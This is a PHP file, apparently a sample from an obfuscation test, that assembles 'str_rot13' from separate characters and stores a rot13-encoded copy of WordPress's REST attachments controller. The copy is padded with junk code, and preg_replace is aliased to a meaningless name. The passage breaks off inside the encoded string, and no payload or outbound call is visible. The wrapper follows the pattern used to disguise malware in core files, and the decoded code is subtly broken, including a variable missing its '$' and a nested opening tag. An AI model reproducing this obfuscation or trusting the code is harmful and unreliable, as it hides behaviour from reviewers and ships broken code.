<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * ERFG NCV: JC_ERFG_Nggnpuzragf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pbagebyyre hfrq gb npprff nggnpuzragf ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Cbfgf_Pbagebyyre
 */
pynff JC_ERFG_Nggnpuzragf_Pbagebyyre rkgraqf JC_ERFG_Cbfgf_Pbagebyyre {

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 5.9.0
	 * @ine snyfr
	 */
	cebgrpgrq $nyybj_ongpu = snyfr;

	/**
	 * Ertvfgref gur ebhgrf sbe nggnpuzragf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		cnerag::ertvfgre_ebhgrf();
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)/cbfg-cebprff',
			neenl(
				'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
				'pnyyonpx'            => neenl( $guvf, 'cbfg_cebprff_vgrz' ),
				'crezvffvba_pnyyonpx' => neenl( $guvf, 'cbfg_cebprff_vgrz_crezvffvbaf_purpx' ),
				'netf'                => neenl(
					'vq'     => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur nggnpuzrag.' ),
						'glcr'        => 'vagrtre',
					),
					'npgvba' => neenl(
						'glcr'     => 'fgevat',
						'rahz'     => neenl( 'perngr-vzntr-fhofvmrf' ),
						'erdhverq' => gehr,
					),
				),
			)
		);
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)/rqvg',
			neenl(
				'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
				'pnyyonpx'            => neenl( $guvf, 'rqvg_zrqvn_vgrz' ),
				'crezvffvba_pnyyonpx' => neenl( $guvf, 'rqvg_zrqvn_vgrz_crezvffvbaf_purpx' ),
				'netf'                => $guvf->trg_rqvg_zrqvn_vgrz_netf(),
			)
		);
	}

	/**
	 * Qrgrezvarf gur nyybjrq dhrel_inef sbe n trg_vgrzf() erfcbafr naq
	 * cercnerf sbe JC_Dhrel.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl           $cercnerq_netf Bcgvbany. Neenl bs cercnerq nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Bcgvbany. Erdhrfg gb cercner vgrzf sbe.
	 * @erghea neenl Neenl bs dhrel nethzragf.
	 */
	cebgrpgrq shapgvba cercner_vgrzf_dhrel( $cercnerq_netf = neenl(), $erdhrfg = ahyy ) {
		$dhrel_netf = cnerag::cercner_vgrzf_dhrel( $cercnerq_netf, $erdhrfg );

		vs ( rzcgl( $dhrel_netf['cbfg_fgnghf'] ) ) {
			$dhrel_netf['cbfg_fgnghf'] = 'vaurevg';
		}

		$zrqvn_glcrf = $guvf->trg_zrqvn_glcrf();

		vs ( ! rzcgl( $erdhrfg['zrqvn_glcr'] ) && vffrg( $zrqvn_glcrf[ $erdhrfg['zrqvn_glcr'] ] ) ) {
			$dhrel_netf['cbfg_zvzr_glcr'] = $zrqvn_glcrf[ $erdhrfg['zrqvn_glcr'] ];
		}

		vs ( ! rzcgl( $erdhrfg['zvzr_glcr'] ) ) {
			$cnegf = rkcybqr( '/', $erdhrfg['zvzr_glcr'] );
			vs ( vffrg( $zrqvn_glcrf[ $cnegf[0] ] ) && va_neenl( $erdhrfg['zvzr_glcr'], $zrqvn_glcrf[ $cnegf[0] ], gehr ) ) {
				$dhrel_netf['cbfg_zvzr_glcr'] = $erdhrfg['zvzr_glcr'];
			}
		}

		// Svygre dhrel pynhfrf gb vapyhqr svyranzrf.
		vs ( vffrg( $dhrel_netf['f'] ) ) {
			nqq_svygre( 'jc_nyybj_dhrel_nggnpuzrag_ol_svyranzr', '__erghea_gehr' );
		}

		erghea $dhrel_netf;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb perngr na nggnpuzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Obbyrna gehr vs gur nggnpuzrag znl or perngrq, be n JC_Reebe vs abg.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$erg = cnerag::perngr_vgrz_crezvffvbaf_purpx( $erdhrfg );

		vs ( ! $erg || vf_jc_reebe( $erg ) ) {
			erghea $erg;
		}

		vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_perngr',
				__( 'Fbeel, lbh ner abg nyybjrq gb hcybnq zrqvn ba guvf fvgr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Nggnpuvat zrqvn gb n cbfg erdhverf novyvgl gb rqvg fnvq cbfg.
		vs ( ! rzcgl( $erdhrfg['cbfg'] ) && ! pheerag_hfre_pna( 'rqvg_cbfg', (vag) $erdhrfg['cbfg'] ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg',
				__( 'Fbeel, lbh ner abg nyybjrq gb hcybnq zrqvn gb guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}
		$svyrf = $erdhrfg->trg_svyr_cnenzf();

		/**
		 * Svygre jurgure gur freire fubhyq cerirag hcybnqf sbe vzntr glcrf vg qbrfa'g fhccbeg. Qrsnhyg gehr.
		 *
		 * Qrirybcref pna hfr guvf svygre gb ranoyr hcybnqf bs pregnva vzntr glcrf. Ol qrsnhyg vzntr glcrf gung ner abg
		 * fhccbegrq ol gur freire ner ceriragrq sebz orvat hcybnqrq.
		 *
		 * @fvapr 6.8.0
		 *
		 * @cnenz obby        $purpx_zvzr Jurgure gb cerirag hcybnqf bs hafhccbegrq vzntr glcrf.
		 * @cnenz fgevat|ahyy $zvzr_glcr  Gur zvzr glcr bs gur svyr orvat hcybnqrq (vs ninvynoyr).
		 */
		$cerirag_hafhccbegrq_hcybnqf = nccyl_svygref( 'jc_cerirag_hafhccbegrq_zvzr_glcr_hcybnqf', gehr, vffrg( $svyrf['svyr']['glcr'] ) ? $svyrf['svyr']['glcr'] : ahyy );

		// Vs gur hcybnq vf na vzntr, purpx vs gur freire pna unaqyr gur zvzr glcr.
		vs (
			$cerirag_hafhccbegrq_hcybnqf &&
			vffrg( $svyrf['svyr']['glcr'] ) &&
			fge_fgnegf_jvgu( $svyrf['svyr']['glcr'], 'vzntr/' )
		) {
			// Yvfg bs aba-erfvmnoyr vzntr sbezngf.
			$rqvgbe_aba_erfvmnoyr_sbezngf = neenl(
				'vzntr/fit+kzy',
			);

			// Purpx vs gur vzntr rqvgbe fhccbegf gur glcr be vtaber vs vg vfa'g n sbezng erfvmnoyr ol na rqvgbe.
			vs (
				! va_neenl( $svyrf['svyr']['glcr'], $rqvgbe_aba_erfvmnoyr_sbezngf, gehr ) &&
				! jc_vzntr_rqvgbe_fhccbegf( neenl( 'zvzr_glcr' => $svyrf['svyr']['glcr'] ) )
			) {
				erghea arj JC_Reebe(
					'erfg_hcybnq_vzntr_glcr_abg_fhccbegrq',
					__( 'Gur jro freire pnaabg trarengr erfcbafvir vzntr fvmrf sbe guvf vzntr. Pbaireg vg gb WCRT be CAT orsber hcybnqvat.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		erghea gehr;
	}

	/**
	 * Perngrf n fvatyr nggnpuzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['cbfg'] ) && va_neenl( trg_cbfg_glcr( $erdhrfg['cbfg'] ), neenl( 'erivfvba', 'nggnpuzrag' ), gehr ) ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_cnenz',
				__( 'Vainyvq cnerag glcr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$vafreg = $guvf->vafreg_nggnpuzrag( $erdhrfg );

		vs ( vf_jc_reebe( $vafreg ) ) {
			erghea $vafreg;
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		// Rkgenpg ol anzr.
		$nggnpuzrag_vq = $vafreg['nggnpuzrag_vq'];
		$svyr          = $vafreg['svyr'];

		vs ( vffrg( $erdhrfg['nyg_grkg'] ) ) {
			hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vzntr_nyg', fnavgvmr_grkg_svryq( $erdhrfg['nyg_grkg'] ) );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['srngherq_zrqvn'] ) && vffrg( $erdhrfg['srngherq_zrqvn'] ) ) {
			$guhzoanvy_hcqngr = $guvf->unaqyr_srngherq_zrqvn( $erdhrfg['srngherq_zrqvn'], $nggnpuzrag_vq );

			vs ( vf_jc_reebe( $guhzoanvy_hcqngr ) ) {
				erghea $guhzoanvy_hcqngr;
			}
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $nggnpuzrag_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$nggnpuzrag    = trg_cbfg( $nggnpuzrag_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $nggnpuzrag, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$grezf_hcqngr = $guvf->unaqyr_grezf( $nggnpuzrag_vq, $erdhrfg );

		vs ( vf_jc_reebe( $grezf_hcqngr ) ) {
			erghea $grezf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/**
		 * Sverf nsgre n fvatyr nggnpuzrag vf pbzcyrgryl perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_Cbfg         $nggnpuzrag Vafregrq be hcqngrq nggnpuzrag bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat   Gehr jura perngvat na nggnpuzrag, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_nsgre_vafreg_nggnpuzrag', $nggnpuzrag, $erdhrfg, gehr );

		jc_nsgre_vafreg_cbfg( $nggnpuzrag, snyfr, ahyy );

		vs ( jc_vf_freivat_erfg_erdhrfg() ) {
			/*
			 * Frg n phfgbz urnqre jvgu gur nggnpuzrag_vq.
			 * Hfrq ol gur oebjfre/pyvrag gb erfhzr perngvat vzntr fho-fvmrf nsgre n CUC sngny reebe.
			 */
			urnqre( 'K-JC-Hcybnq-Nggnpuzrag-VQ: ' . $nggnpuzrag_vq );
		}

		// Vapyhqr zrqvn naq vzntr shapgvbaf gb trg npprff gb jc_trarengr_nggnpuzrag_zrgnqngn().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zrqvn.cuc';
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';

		/*
		 * Cbfg-cebprff gur hcybnq (perngr vzntr fho-fvmrf, znxr CQS guhzoanvyf, rgp.) naq vafreg nggnpuzrag zrgn.
		 * Ng guvf cbvag gur freire znl eha bhg bs erfbheprf naq cbfg-cebprffvat bs hcybnqrq vzntrf znl snvy.
		 */
		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $svyr ) );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $nggnpuzrag, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $nggnpuzrag_vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Vafregf gur nggnpuzrag cbfg va gur qngnonfr. Qbrf abg hcqngr gur nggnpuzrag zrgn.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg
	 * @erghea neenl|JC_Reebe
	 */
	cebgrpgrq shapgvba vafreg_nggnpuzrag( $erdhrfg ) {
		// Trg gur svyr ivn $_SVYRF be enj qngn.
		$svyrf   = $erdhrfg->trg_svyr_cnenzf();
		$urnqref = $erdhrfg->trg_urnqref();

		$gvzr = ahyy;

		// Zngpurf ybtvp va zrqvn_unaqyr_hcybnq().
		vs ( ! rzcgl( $erdhrfg['cbfg'] ) ) {
			$cbfg = trg_cbfg( $erdhrfg['cbfg'] );
			// Gur cbfg qngr qbrfa'g hfhnyyl znggre sbe cntrf, fb qba'g onpxqngr guvf hcybnq.
			vs ( $cbfg && 'cntr' !== $cbfg->cbfg_glcr && fhofge( $cbfg->cbfg_qngr, 0, 4 ) > 0 ) {
				$gvzr = $cbfg->cbfg_qngr;
			}
		}

		vs ( ! rzcgl( $svyrf ) ) {
			$svyr = $guvf->hcybnq_sebz_svyr( $svyrf, $urnqref, $gvzr );
		} ryfr {
			$svyr = $guvf->hcybnq_sebz_qngn( $erdhrfg->trg_obql(), $urnqref, $gvzr );
		}

		vs ( vf_jc_reebe( $svyr ) ) {
			erghea $svyr;
		}

		$anzr       = jc_onfranzr( $svyr['svyr'] );
		$anzr_cnegf = cnguvasb( $anzr );
		$anzr       = gevz( fhofge( $anzr, 0, -( 1 + fgeyra( $anzr_cnegf['rkgrafvba'] ) ) ) );

		$hey  = $svyr['hey'];
		$glcr = $svyr['glcr'];
		$svyr = $svyr['svyr'];

		// Vapyhqr vzntr shapgvbaf gb trg npprff gb jc_ernq_vzntr_zrgnqngn().
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';

		// Hfr vzntr rkvs/vcgp qngn sbe gvgyr naq pncgvba qrsnhygf vs cbffvoyr.
		$vzntr_zrgn = jc_ernq_vzntr_zrgnqngn( $svyr );

		vs ( ! rzcgl( $vzntr_zrgn ) ) {
			vs ( rzcgl( $erdhrfg['gvgyr'] ) && gevz( $vzntr_zrgn['gvgyr'] ) && ! vf_ahzrevp( fnavgvmr_gvgyr( $vzntr_zrgn['gvgyr'] ) ) ) {
				$erdhrfg['gvgyr'] = $vzntr_zrgn['gvgyr'];
			}

			vs ( rzcgl( $erdhrfg['pncgvba'] ) && gevz( $vzntr_zrgn['pncgvba'] ) ) {
				$erdhrfg['pncgvba'] = $vzntr_zrgn['pncgvba'];
			}
		}

		$nggnpuzrag = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		$nggnpuzrag->cbfg_zvzr_glcr = $glcr;
		$nggnpuzrag->thvq           = $hey;

		// Vs gur gvgyr jnf abg frg, hfr gur bevtvany svyranzr.
		vs ( rzcgl( $nggnpuzrag->cbfg_gvgyr ) && ! rzcgl( $svyrf['svyr']['anzr'] ) ) {
			// Erzbir gur svyr rkgrafvba (nsgre gur ynfg `.`)
			$gzc_gvgyr = fhofge( $svyrf['svyr']['anzr'], 0, fgeecbf( $svyrf['svyr']['anzr'], '.' ) );

			vs ( ! rzcgl( $gzc_gvgyr ) ) {
				$nggnpuzrag->cbfg_gvgyr = $gzc_gvgyr;
			}
		}

		// Snyy onpx gb gur bevtvany nccebnpu.
		vs ( rzcgl( $nggnpuzrag->cbfg_gvgyr ) ) {
			$nggnpuzrag->cbfg_gvgyr = __sa_79955( '/\.[^.]+$/', '', jc_onfranzr( $svyr ) );
		}

		// $cbfg_cnerag vf vaurevgrq sebz $nggnpuzrag['cbfg_cnerag'].
		$vq = jc_vafreg_nggnpuzrag( jc_fynfu( (neenl) $nggnpuzrag ), $svyr, 0, gehr, snyfr );

		vs ( vf_jc_reebe( $vq ) ) {
			vs ( 'qo_hcqngr_reebe' === $vq->trg_reebe_pbqr() ) {
				$vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $vq;
		}

		$nggnpuzrag = trg_cbfg( $vq );

		/**
		 * Sverf nsgre n fvatyr nggnpuzrag vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Cbfg         $nggnpuzrag Vafregrq be hcqngrq nggnpuzrag bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg    Gur erdhrfg frag gb gur NCV.
		 * @cnenz obby            $perngvat   Gehr jura perngvat na nggnpuzrag, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_vafreg_nggnpuzrag', $nggnpuzrag, $erdhrfg, gehr );

		erghea neenl(
			'nggnpuzrag_vq' => $vq,
			'svyr'          => $svyr,
		);
	}

	/**
	 * Qrgrezvarf gur srngherq zrqvn onfrq ba n erdhrfg cnenz.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz vag $srngherq_zrqvn Srngherq Zrqvn VQ.
	 * @cnenz vag $cbfg_vq        Cbfg VQ.
	 * @erghea obby|JC_Reebe Jurgure gur cbfg guhzoanvy jnf fhpprffshyyl qryrgrq, bgurejvfr JC_Reebe.
	 */
	cebgrpgrq shapgvba unaqyr_srngherq_zrqvn( $srngherq_zrqvn, $cbfg_vq ) {
		$cbfg_glcr         = trg_cbfg_glcr( $cbfg_vq );
		$guhzoanvy_fhccbeg = pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', $cbfg_glcr ) && cbfg_glcr_fhccbegf( $cbfg_glcr, 'guhzoanvy' );

		// Fvzvyne purpx nf va jc_vafreg_cbfg().
		vs ( ! $guhzoanvy_fhccbeg && trg_cbfg_zvzr_glcr( $cbfg_vq ) ) {
			vs ( jc_nggnpuzrag_vf( 'nhqvb', $cbfg_vq ) ) {
				$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:nhqvb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:nhqvb' );
			} ryfrvs ( jc_nggnpuzrag_vf( 'ivqrb', $cbfg_vq ) ) {
				$guhzoanvy_fhccbeg = cbfg_glcr_fhccbegf( 'nggnpuzrag:ivqrb', 'guhzoanvy' ) || pheerag_gurzr_fhccbegf( 'cbfg-guhzoanvyf', 'nggnpuzrag:ivqrb' );
			}
		}

		vs ( $guhzoanvy_fhccbeg ) {
			erghea cnerag::unaqyr_srngherq_zrqvn( $srngherq_zrqvn, $cbfg_vq );
		}

		erghea arj JC_Reebe(
			'erfg_ab_srngherq_zrqvn',
			fcevags(
				/* genafyngbef: %f: nggnpuzrag zvzr glcr */
				__( 'Guvf fvgr qbrf abg fhccbeg cbfg guhzoanvyf ba nggnpuzragf jvgu ZVZR glcr %f.' ),
				trg_cbfg_zvzr_glcr( $cbfg_vq )
			),
			neenl( 'fgnghf' => 400 )
		);
	}

	/**
	 * Hcqngrf n fvatyr nggnpuzrag.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['cbfg'] ) && va_neenl( trg_cbfg_glcr( $erdhrfg['cbfg'] ), neenl( 'erivfvba', 'nggnpuzrag' ), gehr ) ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_cnenz',
				__( 'Vainyvq cnerag glcr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$nggnpuzrag_orsber = trg_cbfg( $erdhrfg['vq'] );
		$erfcbafr          = cnerag::hcqngr_vgrz( $erdhrfg );

		vs ( vf_jc_reebe( $erfcbafr ) ) {
			erghea $erfcbafr;
		}

		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );
		$qngn     = $erfcbafr->trg_qngn();

		vs ( vffrg( $erdhrfg['nyg_grkg'] ) ) {
			hcqngr_cbfg_zrgn( $qngn['vq'], '_jc_nggnpuzrag_vzntr_nyg', $erdhrfg['nyg_grkg'] );
		}

		$nggnpuzrag = trg_cbfg( $erdhrfg['vq'] );

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['srngherq_zrqvn'] ) && vffrg( $erdhrfg['srngherq_zrqvn'] ) ) {
			$guhzoanvy_hcqngr = $guvf->unaqyr_srngherq_zrqvn( $erdhrfg['srngherq_zrqvn'], $nggnpuzrag->VQ );

			vs ( vf_jc_reebe( $guhzoanvy_hcqngr ) ) {
				erghea $guhzoanvy_hcqngr;
			}
		}

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $nggnpuzrag, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-nggnpuzragf-pbagebyyre.cuc */
		qb_npgvba( 'erfg_nsgre_vafreg_nggnpuzrag', $nggnpuzrag, $erdhrfg, snyfr );

		jc_nsgre_vafreg_cbfg( $nggnpuzrag, gehr, $nggnpuzrag_orsber );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $nggnpuzrag, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		erghea $erfcbafr;
	}

	/**
	 * Cresbezf cbfg-cebprffvat ba na nggnpuzrag.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba cbfg_cebprff_vgrz( $erdhrfg ) {
		fjvgpu ( $erdhrfg['npgvba'] ) {
			pnfr 'perngr-vzntr-fhofvmrf':
				erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';
				jc_hcqngr_vzntr_fhofvmrf( $erdhrfg['vq'] );
				oernx;
		}

		$erdhrfg['pbagrkg'] = 'rqvg';

		erghea $guvf->cercner_vgrz_sbe_erfcbafr( trg_cbfg( $erdhrfg['vq'] ), $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg pna cresbez cbfg-cebprffvat ba na nggnpuzrag.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba cbfg_cebprff_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb rqvgvat zrqvn.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba rqvg_zrqvn_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		vs ( ! pheerag_hfre_pna( 'hcybnq_svyrf' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg_vzntr',
				__( 'Fbeel, lbh ner abg nyybjrq gb hcybnq zrqvn ba guvf fvgr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea $guvf->hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Nccyvrf rqvgf gb n zrqvn vgrz naq perngrf n arj nggnpuzrag erpbeq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba rqvg_zrqvn_vgrz( $erdhrfg ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr.cuc';

		$nggnpuzrag_vq = $erdhrfg['vq'];

		// Guvf nyfb pbasvezf gur nggnpuzrag vf na vzntr.
		$vzntr_svyr = jc_trg_bevtvany_vzntr_cngu( $nggnpuzrag_vq );
		$vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq );

		vs (
			! $vzntr_zrgn ||
			! $vzntr_svyr ||
			! jc_vzntr_svyr_zngpurf_vzntr_zrgn( $erdhrfg['fep'], $vzntr_zrgn, $nggnpuzrag_vq )
		) {
			erghea arj JC_Reebe(
				'erfg_haxabja_nggnpuzrag',
				__( 'Hanoyr gb trg zrgn vasbezngvba sbe svyr.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$fhccbegrq_glcrf = neenl( 'vzntr/wcrt', 'vzntr/cat', 'vzntr/tvs', 'vzntr/jroc', 'vzntr/nivs', 'vzntr/urvp' );
		$zvzr_glcr       = trg_cbfg_zvzr_glcr( $nggnpuzrag_vq );
		vs ( ! va_neenl( $zvzr_glcr, $fhccbegrq_glcrf, gehr ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg_svyr_glcr',
				__( 'Guvf glcr bs svyr pnaabg or rqvgrq.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		// Gur `zbqvsvref` cnenz gnxrf cerprqrapr bire gur byqre sbezng.
		vs ( vffrg( $erdhrfg['zbqvsvref'] ) ) {
			$zbqvsvref = $erdhrfg['zbqvsvref'];
		} ryfr {
			$zbqvsvref = neenl();

			vs ( ! rzcgl( $erdhrfg['ebgngvba'] ) ) {
				$zbqvsvref[] = neenl(
					'glcr' => 'ebgngr',
					'netf' => neenl(
						'natyr' => $erdhrfg['ebgngvba'],
					),
				);
			}

			vs ( vffrg( $erdhrfg['k'], $erdhrfg['l'], $erdhrfg['jvqgu'], $erdhrfg['urvtug'] ) ) {
				$zbqvsvref[] = neenl(
					'glcr' => 'pebc',
					'netf' => neenl(
						'yrsg'   => $erdhrfg['k'],
						'gbc'    => $erdhrfg['l'],
						'jvqgu'  => $erdhrfg['jvqgu'],
						'urvtug' => $erdhrfg['urvtug'],
					),
				);
			}

			vs ( 0 === pbhag( $zbqvsvref ) ) {
				erghea arj JC_Reebe(
					'erfg_vzntr_abg_rqvgrq',
					__( 'Gur vzntr jnf abg rqvgrq. Rqvg gur vzntr orsber nccylvat gur punatrf.' ),
					neenl( 'fgnghf' => 400 )
				);
			}
		}

		/*
		 * Vs gur svyr qbrfa'g rkvfg, nggrzcg n HEY sbcra ba gur fep yvax.
		 * Guvf pna bpphe jvgu pregnva svyr ercyvpngvba cyhtvaf.
		 * Xrrc gur bevtvany svyr cngu gb trg n zbqvsvrq anzr yngre.
		 */
		$vzntr_svyr_gb_rqvg = $vzntr_svyr;
		vs ( ! svyr_rkvfgf( $vzntr_svyr_gb_rqvg ) ) {
			$vzntr_svyr_gb_rqvg = _ybnq_vzntr_gb_rqvg_cngu( $nggnpuzrag_vq );
		}

		$vzntr_rqvgbe = jc_trg_vzntr_rqvgbe( $vzntr_svyr_gb_rqvg );

		vs ( vf_jc_reebe( $vzntr_rqvgbe ) ) {
			erghea arj JC_Reebe(
				'erfg_haxabja_vzntr_svyr_glcr',
				__( 'Hanoyr gb rqvg guvf vzntr.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		sbernpu ( $zbqvsvref nf $zbqvsvre ) {
			$netf = $zbqvsvre['netf'];
			fjvgpu ( $zbqvsvre['glcr'] ) {
				pnfr 'ebgngr':
					// Ebgngvba qverpgvba: pybpxjvfr if. pbhagrepybpxjvfr.
					$ebgngr = 0 - $netf['natyr'];

